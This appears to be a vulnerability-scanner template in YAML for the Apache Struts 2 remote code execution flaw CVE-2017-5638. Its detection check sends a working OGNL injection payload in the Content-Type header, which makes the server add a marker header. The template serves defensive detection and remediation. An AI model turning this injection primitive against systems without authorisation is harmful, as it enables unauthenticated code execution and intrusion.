id: CVE-2017-5638-struts2-rce
cve: CVE-2017-5638
name: "Apache Struts 2 Jakarta Multipart Parser RCE"
severity: critical
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
tags: [rce, struts, java, cisa-kev]
target_service: http
description: |
  Apache Struts 2 Content-Type header OGNL injection allowing
  unauthenticated remote code execution. Used in the Equifax breach.
detection:
  - type: http
    method: GET
    path: "/"
    headers:
      Content-Type: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','vulnerable')}.multipart/form-data"
    match:
      - header_contains: "X-Struts-Test"
  - type: http
    method: GET
    paths: ["/", "/login.action", "/index.action"]
    match:
      - body_regex: "(?i)(struts|action.*\\.do|action.*\\.action)"
    match_all: false
remediation: "Upgrade Struts to 2.5.12+ or 2.3.32+."
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
